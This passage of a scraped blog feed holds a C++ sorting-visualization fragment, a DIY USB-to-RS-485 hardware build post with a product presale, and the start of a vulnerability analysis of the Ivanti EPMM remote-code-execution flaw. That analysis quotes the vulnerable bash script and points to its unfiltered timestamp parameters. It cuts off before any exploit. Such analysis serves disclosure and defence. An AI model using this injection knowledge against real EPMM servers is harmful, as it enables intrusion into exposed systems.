1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">res/circle_</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span> + colors[i] + <span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">.png</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n      Sprite </span>*js = <span style=\"color: rgba(0, 0, 255, 1);\">new</span> Sprite(s); <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">新建角色，以s为造型</span>\n      js-&gt;scale(v/<span style=\"color: rgba(128, 0, 128, 1);\">100.0</span>);        <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">把角色缩小，要不然太大了</span>\n      js-&gt;penup();  js-&gt;go(x,<span style=\"color: rgba(128, 0, 128, 1);\">0</span>); js-&gt;speed(<span style=\"color: rgba(128, 0, 128, 1);\">1</span>); <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">定好起始位置</span>\n      node-&gt;sp = js;             <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">节点包含有角色指针</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">      datas.push_back(node);      \n      x </span>= x + <span style=\"color: rgba(128, 0, 128, 1);\">100</span>;     <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">每个节点相差100个单位</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">   }\n   Sprite pen{</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">blank</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">}; \n   pen.up().color(</span><span style=\"color: rgba(128, 0, 128, 1);\">0</span>).sety(<span style=\"color: rgba(128, 0, 128, 1);\">300</span>).write(<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">冒泡排序算法可视化演示程序</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 128, 1);\">50</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n   pen.color(</span><span style=\"color: rgba(128, 0, 128, 1);\">30</span>).sety(<span style=\"color: rgba(128, 0, 128, 1);\">230</span>).write(<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">作者：李兴球,采用C++精灵库</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 128, 1);\">30</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n   pen.color(</span><span style=\"color: rgba(128, 0, 128, 1);\">60</span>).sety(<span style=\"color: rgba(128, 0, 128, 1);\">180</span>).write(<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">C++精灵库作者：李兴球</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 128, 1);\">20</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n   rocket.wait(</span><span style=\"color: rgba(128, 0, 128, 1);\">1</span>).color(<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">yellow</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>).penup().sety(<span style=\"color: rgba(128, 0, 128, 1);\">130</span><span style=\"color: rgba(0, 0, 0, 1);\">).hide();\n   </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">真正的冒泡排序核心程序开始了</span>\n   <span style=\"color: rgba(0, 0, 255, 1);\">for</span>(<span style=\"color: rgba(0, 0, 255, 1);\">int</span> j=<span style=\"color: rgba(128, 0, 128, 1);\">1</span>;j&lt;n;j++){  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">排序的核心程序在这里</span>\n      <span style=\"color: rgba(0, 0, 255, 1);\">string</span> s = <span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">第 </span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span> + to_string(j) + <span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\"> 轮</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">;    \n      </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">删除最早写的文字，然后写上新的文字，并且等待1秒  </span>\n      rocket.cleartxts(<span style=\"color: rgba(128, 0, 128, 1);\">1</span>).write(s,<span style=\"color: rgba(128, 0, 128, 1);\">42</span>).wait(<span style=\"color: rgba(128, 0, 128, 1);\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n      </span><span style=\"color: rgba(0, 0, 255, 1);\">for</span>(<span style=\"color: rgba(0, 0, 255, 1);\">int</span> i=<span style=\"color: rgba(128, 0, 128, 1);\">0</span>;i&lt;n-j;i++<span style=\"color: rgba(0, 0, 0, 1);\">)   \n         </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span>(datas[i]-&gt;value &gt; datas[i+<span style=\"color: rgba(128, 0, 128, 1);\">1</span>]-&gt;value ) <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">发现更大的，则交换</span>\n             swap(i,i+<span style=\"color: rgba(128, 0, 128, 1);\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n      rocket.wait(</span><span style=\"color: rgba(128, 0, 128, 1);\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n   }\n   rocket.cleartxts(</span><span style=\"color: rgba(128, 0, 128, 1);\">1</span>).write(<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">演示完毕！</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>,<span style=\"color: rgba(128, 0, 128, 1);\">42</span>).done();     <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">完成了</span>\n   <span style=\"color: rgba(0, 0, 255, 1);\">return</span> <span style=\"color: rgba(128, 0, 128, 1);\">0</span>;    <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">返回0</span>\n}</pre>\n</div>\n<p>&nbsp;</p>\n\n</div>\n<div class=\"clear\"></div>\n\n\t<div class=\"postDesc\">posted on \n<span id=\"post-date\">2026-02-02 20:13</span>&nbsp;\n<a href=\"https://www.cnblogs.com/lixingqiu\">李兴球</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "有手就行！我自制了一个高速USB转4路隔离RS-485的模块。",
      "link": "https://www.cnblogs.com/xiaomage-UAV/p/19566208",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xiaomage-UAV/p/19566208\" id=\"cb_post_title_url\" title=\"发布于 2026-02-02 19:35\">\n    <span>有手就行！我自制了一个高速USB转4路隔离RS-485的模块。</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>最近做一个项目要用到USB转多路RS-485接口进行调试，在网上找了一圈，发现市面上现有的产品，缺点还是太明显了，1、USB口大多都是Type-B连接器，2、大多采用塑料外壳，看着不够高级，3、有的不带隔离功能，这样很容易把电脑USB口给干废了，4、RS-485通信的波特率太低，5、上面几个坑都避开的产品，又只转出了一路485。符合我需求的产品竟然没找到，于是我打算自己做一个产品级的高速USB转多路RS-485接口的设备。<br />\n其实USB转RS-485的本质是USB转串口，然后串口挂个RS-485收发器就可以实现。所以现在需要找一个合适的USB转多路串口的芯片，一开始想到的是FT4232，这个可以实现USB转4通道12Mbps的串口。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n可是当看这个芯片在立创商城的价格之后，我直呼告辞。我是想做一个产品，但是我不想做一个我自己都用不起的产品啊。<br />\n当然，还有另外的问题，就是这个FT4232的IO口电平只支持3.3V。这个如果用来调试其他电平的外设会很麻烦，还需要加电平转换电路。<br />\n之前用老牌USB厂家沁恒的CH343P自制了一个USB转串口TTL模块，最高波特率能到6Mbps(附链接)粉丝反响极佳，于是目光自然转向了沁恒的高速USB转4串口芯片CH9114，这个系列的芯片支持480Mbps的高速USB通信，可以扩展出4路15Mbps的串口，支持1.2V、1.8V、2.5V、3.3V的IO口电平，它在电脑上的驱动支持VCP和CDC两种。<br />\n这里简单科普一下VCP和CDC二者的区别：CDC驱动是部分操作系统的内置USB串口驱动，Windows10及以上版本的系统内置，更早的版本需要手动安装，Linux和Android视具体的系统而定。而VCP驱动是厂商提供的专用USB虚拟串口驱动程序，工作时在Windows系统的“端口（COM和LPT）”一栏会生成COM口，Linux/Android/macOS系统在/dev目录下会生成TTY设备节点。<br />\nVCP驱动的特点是支持高速率通信及硬件流控、支持GPIO扩展、仿真标准串口、计算机端串口应用程序完全兼容、驱动只需要安装一次且可联网自动安装、可配合应用层动态库使用，提供USB热拔插、串口号检测、GPIO等扩展功能。所以建议优先选择使用VCP驱动。<br />\n另外可能有人要问了，485模块用得着这么高的波特率吗？答案是，有这个需要的，比如多摩川编码器采用的就是波特率固定为2.5MHz或者5MHz的基于RS-485的专用串口通讯协议。（本文末尾附波特率测试环节）<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n比较爽的是，CH9114有好几种封装形式，其中CH9114L兼容FT4232HL，CH9114W封装兼容FT4232H-56Q，除了这两种封装，还有一个CH9114F是QFN32封装，尺寸非常小，很适合我用来做这个高速USB转多路RS-485接口设备。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n最最最关键的是，在立创商城看了一下这个芯片的价格比前面选的FT4232合理多了，十几块钱，是我能用得起的。<br />\n芯片选定了，就可以画原理图了。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n这个芯片的原理图比较简单，总共加上四个电容就可以了。另外，外挂485收发器时，可以把RI这个信号直接用来做收发器的收发切换，按照上图中绿框中所示，给这个引脚加个下拉电阻就行。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\nCH9114的手册中提到，如果芯片工作环境相对比较理想，且串口波特率误差能满足使用需求，就可以不焊接外部晶振，只需要将XI引脚连接GND就可以切换内部时钟。但是我要做高性能的收发器，所以不必省钱。于是在PCB上放了扬兴的XL7KI-111-24M晶振，它采用2016超小封装，放在板子上不占面积，而且25℃工况精度为±10ppm，这样整个收发器的波特率精度就会很高。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n这个设备用USB2.0通信，使用Type-C接口不需要考虑数据线正反插识别的问题，所以用Type-C口是最爽的。但是要注意，给连接器的两个CC引脚接5.1K的下拉电阻。另外，USB信号线上加一个ESD保护芯片，VBUS电源输入要加个自恢复保险丝。虽然沁恒也有给USB芯片配套的ESD保护芯片CH412，但那个芯片有四路，我只用两路，所以选了个ST的。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n这是RS-485隔离收发器的电路。这里采用的隔离收发器是TI的ISO3088DWR，这个收发器符合TIA/EIA RS-485的要求，速率20Mbps，1/8单位负载让总线上可以挂256个这样的节点。一个芯片实现了RS-485收发器的功能+20Mbps速率信号的隔离，用起来还是很爽的。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n原理图搞定之后，PCB设计就比较简单了，所有器件放在顶层就可以了。隔离电源和485隔离收发器放在同一列，这样方便做隔离。布局布线完成之后进行投板就行。<br />\n板子为啥设计成这样子呢？这就有点像航天发动机的尺寸设计最终要追溯到古代的两匹马的屁股距离是一个道理。首先，把4个3.81的凤凰端子放在板子右侧之后，这四个凤凰端子的距离基本确定了，于是板子的大概宽度就有了。根据器件的简单布局，可以确定出板子的大概长度。再根据这个大概的宽度和长度，选择一款合适的铝合金型材，作为他的外壳。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n这是选择的外壳的横截面，它上下可以分离，这样方便安装焊接了直插LED的电路板。安装电路板的槽，宽度确定是56.6mm，这样板子可以做56mm。厚度2mm上差+0.1左右，于是我选择做2mm厚的PCB，在安装处不带铜皮和绿油的情况下是2mm-0.1mm左右，安装起来会比较舒服。<br />\n这里不得不吐槽一句，2mm的板子打样批量都比1.6mm的板子贵了好多啊，但是好处是，也结实了好多，不怕频繁拔插端子导致板子焊接点不良。同步设计好PCB和外壳之后，就等着它们到货了。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n拿到的PCB很漂亮，不知道是谁设计出这么漂亮的PCB板。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n上好锡膏，麻利的摆好了物料，丢进炉子焊接好之后，再手动焊接一下凤凰端子、隔离电源，LED指示灯，这个板子就成了。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n准备好电路板，铝合金型材外壳，螺丝，就可以开始安装了。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n再把面板贴上去，这样一个满满工业风的，速度高达15Mbps的USB转4路隔离RS-485模块就做好了。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n这个挡板上Type-C口开得很完美，看着舒服感拉满了。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n我给后壳上开了两个螺丝孔，这样可以安装一个标准导轨卡扣，可以方便地安装在35mm导轨上了。<br />\n性能体验：<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n插上电脑直接显示出了四路串口，分别用ABCD区分。这与我面板上的CH-A，CH-B，CH-C，CH-D一一对应。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n把模块的CH-A和CH-C用端子线连接起来，然后打开两个串口上位机，其中一个打开CH-A对应的串口，另一个打开CH-C对应的串口，两个串口的波特率都手动输入15000000，表示15Mbps。然后使用CH-A定时50ms发送一次数据，发送内容为“这是一次高速485通信测试！”，共计发送13988个字节，接收端也显示接收到13988个字节，无丢帧。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n做一个传输文件的测试，其中左边的窗口打开CH-A通道，右边的串口打开CH-C通道，波特率都设置为15Mbps，左边窗口作为发送端，发送一个338MB的视频文件，右边窗口接收文件，开始发送后，通信速度稳定在1427KB/s的速度，传输结束后显示用时252s，传输完成后，在右边的窗口中，保存接收的文件为aaa.mp4，然后打开这个视频可正常播放，说明没有任何误码、错码的问题。使用RS485传输数据，能达到这个速度很赞了。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n另外这个COMTransmit上位机是支持远程操作串口或者把串口数据中继给远端的功能。我顺便测试了一下这个远程串口功能。在位于西安的A电脑上打开COMTransmit上位机，选中远程串口的功能之后，会弹出一个IoCHub远程串口的窗口，然后点击启用远程连接服务，把自己的本地识别码复制发送给位于武汉的B电脑。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\nB电脑远程连接A电脑之后，打开了A电脑上连接的485串口CH-A通道，然后100ms发送一次数据。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\nA电脑上可以显示远程连接的信息，在485模块上把CH-A和CH-C用双绞线连接之后，使用另一个串口工具打开CH-C可以接收到数据，说明远程操作成功，那这意味着什么呢，意味着有了这个功能之后，有时候原本需要出差的一些调试工作，现在远程串口直接搞定。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n根据这个手册里的描述，CH9114内置EEPROM，可配置芯片VID、PID、最大电流值、厂商和产品信息字符串等参数。这样的话，后面如果大批量出货，完全可以通过写入内置EEPROM来让它插入电脑后显示属于自己的产品识别码和厂商信息等等，咨询过芯片厂家，有信息修改工具配套，软硬件全方面支持，还是挺不错的。<br />\n<img alt=\"image\" class=\"lazyload\" /><br />\n这个产品，我已经把它上传到我的淘宝店进行预售，大家可以在淘宝搜索“小马哥CH9114F方案USB转四通道铝合金外壳RS-485高速隔离模块预售”找到淘宝页面参与预售，15天内可以发货。预售的价格暂定168元，预售结束后正常售价目前暂定348，产品清单里除了这个模块本身，还包含了一根AC硅胶数据线、四个凤凰端子、以及一个配套的轨道卡扣。当然，在这个文章中，我也把关键的原理图展示给大家了，PCB设计和外壳选型也都详细的说了，大家感兴趣的也可以自己制作，欢迎共同交流提高。</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-02 19:35</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xiaomage-UAV\">电子开发学习</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Ivanti EPMM RCE CVE-2026-1340/1281完整分析",
      "link": "https://www.cnblogs.com/mhtsec/p/19566043",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/mhtsec/p/19566043\" id=\"cb_post_title_url\" title=\"发布于 2026-02-02 18:41\">\n    <span>Ivanti EPMM RCE CVE-2026-1340/1281完整分析</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"前言\">前言：</h2>\n<p>文中技术分析仅供交流讨论，poc仅供合法测试，用于企业自查，切勿用于非法测试，未授权测试造成后果由使用者承担，与本公众号以及棉花糖无关。</p>\n<h2 id=\"介绍\">介绍：</h2>\n<p>近日,Ivanti公司披露了Ivanti Endpoint Manager Mobile (EPMM)中存在的代码注入漏洞(<strong>CVE-2026-1281</strong>和<strong>CVE-2026-1340</strong>)，并确认<strong>已存在在野利用</strong>。该漏洞源于 Apache HTTPd 调用的 Bash 脚本在处理时间戳比较时，未能有效过滤恶意参数，导致攻击者可利用 Bash 算术扩展特性注入系统命令。</p>\n<h2 id=\"分析\">分析：</h2>\n<p>首先拿到补丁包</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>RPM的包那就好办了，直接查看它执行了什么即可，使用命令：</p>\n<pre><code>rpm -qp --scripts ivanti-security-update-1761642-1.0.0L-5.noarch.rpm\n</code></pre>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>emmm内容有点多，不过根据已知条件，该漏洞源于 Apache HTTPd ，补丁包里面很容易看到关键的修改Apache HTTPd配置的命令：</p>\n<pre><code>/bin/sed -i \\\n  -e 's|RewriteMap mapAppStoreURL prg:/mi/bin/map-appstore-url|RewriteMap mapAppStoreURL \"prg:/bin/java -cp /mi/bin AppStoreUrlMapper\"|g' \\\n  -e 's|RewriteMap mapAftStoreURL prg:/mi/bin/map-aft-store-url|RewriteMap mapAftStoreURL \"prg:/bin/java -cp /mi/bin AFTUrlMapper\"|g' \\\n  /etc/httpd/conf.d/ssl.conf\n</code></pre>\n<p>就是说把<code>map-appstore-url</code>和<code>map-aft-store-url</code>给换掉了不用是吧，ok我们去看看这俩脚本是什么，目录已经给了在mi/bin下，我们直接进终端查一下</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>map-appstore-url和map-aft-store-url是个bash脚本，cat就可以直接看内容(另一个脚本内容差不太多，就不展示了)。</p>\n<pre><code>#!/bin/bash\n\nset -o nounset\n\ndeclare -x MI_DATE_COMMAND=\"date +%Y-%m-%d--%H-%M-%S\"\ndeclare -x MI_DATE_FORMAT=\"%Y-%m-%d--%H-%M-%S\"\n\ndeclare -r kScriptName=$(basename $0)\ndeclare -r kScriptDirectory=$(dirname $0)\ndeclare -r kLogFile=\"/var/log/${kScriptName}.log\"\ndeclare -r kSaltFile=\"/mi/files/appstore-salt.txt\"\n\ndeclare -r kScriptStartTimeSeconds=$(date +%s)\ndeclare -r kValidTimeStampLength=${#kScriptStartTimeSeconds}\n\ndeclare -r kAftFileStoreDirectory='/mi/files/aftstore'\n\n# error codes that are used in /etc/httpd/conf.d/ssl.conf\ndeclare -r kPathTraversalAttemptedErrorCode=\"c91bbeec40aff3fd3fe0c08044c1165a\"\ndeclare -r kLinkHashMismatchErrorCode=\"44b2ff3cf69c5112061aad51e0f7d772\"\ndeclare -r kTooLateErrorCode=\"c6a0e7ca11208b4f11d04a7ee8151a46\"\ndeclare -r kTooEarlyErrorCode=\"80862895184bfa4d00b24d4fbb3d942f\"\ndeclare -r kKeyIndexOutOfBoundsErrorCode=\"f74c27fce7d8e2fecd10ab54eda6bd85\"\ndeclare -r kURLStructureInvalidErrorCode=\"b702087a848177d489a6891bd7869495\"\ndeclare -r kTimestampLengthInvalidErrorCode=\"2ecad569fdaa07e2b66ed2595cf7240f\"\ndeclare -r kLinkSpoofErrorCode=\"cbfa488e9b08d4c5d7b3b2084ffb18e7\"\ndeclare -r kLinkUsingOddTraversalErrorCode=\"f489b91db387b684f56c07e7f5e4308b\"\n\ngShouldLogToFile=\"false\"\ngSaltFileModificationTime=\"0\"\ngTestMode=\"false\"\ngErrorCode=0\ngErrorMessage=\"\"\ndeclare -a gSaltArray=( )\ngCurrentSalt=\"\"\ngHostname=\"\"\ngPath=\"\"\ngStartTime=\"\"\ngEndTime=\"\"\n\nif (( $# &gt; 0 )) ; then\n  gTestMode=\"true\"\nfi\n\n#echo \"gTestMode=${gTestMode}\"\n\n# information\nfunction log() {\n  if ${gTestMode} ; then\n    echo \"`$MI_DATE_COMMAND` -- ${kScriptName} -- ${1}: ${@:2}\"\n  else\n    # do not log since it kills performance\n    echo \"$($MI_DATE_COMMAND) -- ${kScriptName} -- ${1}: ${@:2}\" &gt;&gt; ${kLogFile}\n  fi\n}\n\nfunction logDebug() {\n  if ${gTestMode} ; then\n    echo \"`$MI_DATE_COMMAND` -- ${kScriptName} -- ${1}: ${@:2}\"\n  else\n    # do not log since it kills performance\n    ${gShouldLogToFile} &amp;&amp; echo \"$($MI_DATE_COMMAND) -- ${kScriptName} -- ${1}: ${@:2}\" &gt;&gt; ${kLogFile}\n  fi\n}\n\n# errorCode\n# information\nfunction logDenial() {\n  local theCurrentDate=\"$(MI_DATE_COMMAND)\"\n  if ${gTestMode} ; then\n    echo \"$theCurrentDate -- ${kScriptName} -- ${1}: denying: errorCode=${2}: ${@:3}\"\n  else\n    #echo \"$theCurrentDate -- ${kScriptName} -- ${1}: denying: errorCode=${2}: ${@:3}\" &gt;&gt; \"${kLogFile}\"\n    logger -t \"${kScriptName}\" -i -p local0.warning \"$theCurrentDate -- ${1}: denying: errorCode=${2}: ${@:3}\"\n  fi\n}\n\nlog \"MAIN\" \"starting\"\n\nfunction dumpSaltArray() {\n  log \"${FUNCNAME}\" \"entered\"\n\n  for theSalt in \"${gSaltArray[@]}\" ; do\n    log \"${FUNCNAME}\" \"theSalt=$theSalt\"\n  done\n}\n\nlog \"MAIN\" \"after dumpSaltArray declaration\"\n\nfunction readSaltFile() {\n  if [[ -f \"${kSaltFile}\" ]] ; then\n    theCurrentSaltModificationTime=$(stat -c %Y \"${kSaltFile}\")\n    logDebug \"${FUNCNAME}\" \"theCurrentSaltModificationTime=${theCurrentSaltModificationTime}\"\n    theDeltaTime=$(($theCurrentSaltModificationTime - $gSaltFileModificationTime))\n    logDebug \"${FUNCNAME}\" \"theDeltaTime=${theDeltaTime}\"\n\n    if [[ \"${theDeltaTime}\" -ne 0 ]] ; then\n      log \"${FUNCNAME}\" \"theDeltaTime=${theDeltaTime} not zero; loading salt from kSaltFile=${kSaltFile}\"\n      gSaltArray=( $(cat ${kSaltFile}))\n      gSaltArray[0]=\"\"\n      gSaltFileModificationTime=$theCurrentSaltModificationTime\n    fi\n  else\n    log \"${FUNCNAME}\" \"kSaltFile=${kSaltFile} not found\"\n  fi\n}\n\nlog \"MAIN\" \"after readSaltFile declaration\"\n\n#readSaltFile\n#dumpSaltArray\n#readSaltFile\n\nfunction lookupSaltByIndex() {\n#echo \"$1 ${#gSaltArray[*]}\"\n  if [ \"$1\" -lt ${#gSaltArray[*]} ] ; then\n    gCurrentSalt=${gSaltArray[$1]}\n  else\n    gCurrentSalt=\"\"\n  fi\n\n  logDebug \"${FUNCNAME}\" \"theKeyIndex=$1; gCurrentSalt=$gCurrentSalt\"\n}\n\nlog \"MAIN\" \"after lookupSaltByIndex declaration\"\n\nfunction verifyURLConsistency () {\n  logDebug \"${FUNCNAME}\" \"${1}\"\n  local ret=\"\" # this is what we eventually echo and it's the name of a file for httpd to send to the client or a pattern that Rewrite is aware of and kill the connection with the right HTTP error code\n  #theAppStoreString=${1%%:*}\n  #echo \"${theAppStoreString}\"\n  #declare\n  theOldIFS=\"${IFS}\"\n  local theArgumentArray\n\n  # process what httpd gave us in $1 splitting on the _\n  IFS=\"_\" &amp;&amp; theArgumentArray=(${1})\n\n  theAftStoreString=${theArgumentArray[0]}\n  theAftStoreAssetGUIDWithExtension=${theArgumentArray[1]}\n  gHostname=${theArgumentArray[2]}\n  theURLString=${theArgumentArray[3]}\n  #echo \"${theAftStoreString}\"\n\n  # process what mifs really gave us in $1 splitting on the ,\n  IFS=\",\" &amp;&amp; theAftStoreKeyValueArray=(${theAftStoreString})\n\n  IFS=\"${theOldIFS}\"\n\n  if (( ${#theArgumentArray[@]} != 4 )) ; then\n    ret=\"${kURLStructureInvalidErrorCode}\"\n    log \"${FUNCNAME}\" \"${ret}\" \"expecting 5 segments; actual=${#theArgumentArray[@]}\"\n  fi\n\n  if [[ -z ${ret} ]] ; then\n    for theKeyMapEntry in \"${theAftStoreKeyValueArray[@]}\" ; do\n      theKey=\"${theKeyMapEntry%%=*}\"\n      theValue=\"${theKeyMapEntry##*=}\"\n      logDebug \"${FUNCNAME}\" \"theKey=$theKey; theValue=$theValue\"\n\n      case ${theKey} in\n        kid)\n          gKeyIndex=\"${theValue}\"\n          ;;\n        st)\n          gStartTime=\"${theValue}\"\n          if (( ${#gStartTime} != \"${kValidTimeStampLength}\" )) ; then\n            ret=\"${kTimestampLengthInvalidErrorCode}\"\n          fi\n          ;;\n        et)\n          gEndTime=\"${theValue}\"\n          if (( ${#gEndTime} != \"${kValidTimeStampLength}\" )) ; then\n            ret=\"${kTimestampLengthInvalidErrorCode}\"\n          fi\n          ;;\n        h)\n          gHashPrefixString=\"${theValue}\"\n          ;;\n        *)\n          ret=\"${kURLStructureInvalidErrorCode}\"\n          logDenial \"${FUNCNAME}\" \"${ret}\" \"unknown presented key=${theKey}; theValue=${theValue}\"\n          ;;\n      esac\n    done\n  fi\n\n  if [[ -z ${ret} ]] ; then\n    lookupSaltByIndex ${gKeyIndex}\n\n    if [[ -n \"${gCurrentSalt}\" ]] ; then\n      logDebug \"${FUNCNAME}\" \"continuing: gCurrentSalt=$gCurrentSalt\"\n      theCurrentTimeSeconds=$(date +%s)\n      logDebug \"${FUNCNAME}\" \"theCurrentTimeSeconds=${theCurrentTimeSeconds}\"\n      #theCurrentTimeSeconds=1336011206\n      #theCurrentTimeSeconds=1336770818\n      #gHostname=\"cot-0000001.mobileiron.com\"\n      #gHostname=\"qa42.mobileiron.com\"\n\n      if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]] ; then\n        logDebug \"${FUNCNAME}\" \"continuing: not too early\"\n\n        if [[ ${theCurrentTimeSeconds} -lt ${gEndTime} ]] ; then\n          logDebug \"${FUNCNAME}\" \"continuing: not too late\"\n\n          # calculate the path\n          gPath=${theURLString/\\/sha256:${theAftStoreString}/}\n          theStringToHash=\"${gCurrentSalt}${gHostname}${gPath}${gStartTime}${gEndTime}\"\n          theAssetFile=\"${theAftStoreAssetGUIDWithExtension}\"\n          # the string to hash must end with the assetfile start end\n          logDebug \"${FUNCNAME}\" \"theStringToHash=${theStringToHash}\"\n\n          if [[ \"${theStringToHash}\" = *\"${theAssetFile}${gStartTime}${gEndTime}\" ]] ; then\n            theSHA256Hash=$(echo -n \"${theStringToHash}\" | sha256sum)\n            theSHA256Prefix=${theSHA256Hash:0:64}\n            # theSHA256Prefix=${theSHA256Hash}\n            logDebug \"${FUNCNAME}\" \"theSHA256Hash=$theSHA256Hash; theSHA256Prefix=$theSHA256Prefix\"\n\nshopt -s nocasematch\n            if [[ \"${theSHA256Prefix}\" = \"${gHashPrefixString}\" ]] ; then\n              logDebug \"${FUNCNAME}\" \"hash matched\"\n\n              if [[ \"${theAssetFile}\" = *..* ]] || [[ \"${theAssetFile}\" = .* ]] || [[ \"${theAssetFile}\" = /* ]]; then\n                ret=\"${kPathTraversalAttemptedErrorCode}\"\n                logDenial \"${FUNCNAME}\" \"${ret}\" \"getting spoofed: ${theAssetFile}\"\n              else\n                ret=\"${kAftFileStoreDirectory}\"/\"${theAftStoreAssetGUIDWithExtension}\"\n              fi\n            else\n              ret=\"${kLinkHashMismatchErrorCode}\"\n              logDenial \"${FUNCNAME}\" \"${ret}\" \"link hash mismatch: theSHA256Prefix=$theSHA256Prefix; gHashPrefixString=${gHashPrefixString}; ${1}\"\n            fi\n          else\n            ret=\"${kLinkSpoofErrorCode}\"\n            logDenial \"${FUNCNAME}\" \"${ret}\" \"link being spoofed: theStringToHash=${theStringToHash}; requiredSuffix=${theAppStoreSubDirectory}/${theAppStoreAssetGUID}${theAppStoreAssetExtension}${gStartTime}${gEndTime}; ${1}\"\n          fi\nshopt -u nocasematch\n        else\n          ret=\"${kTooLateErrorCode}\"\n          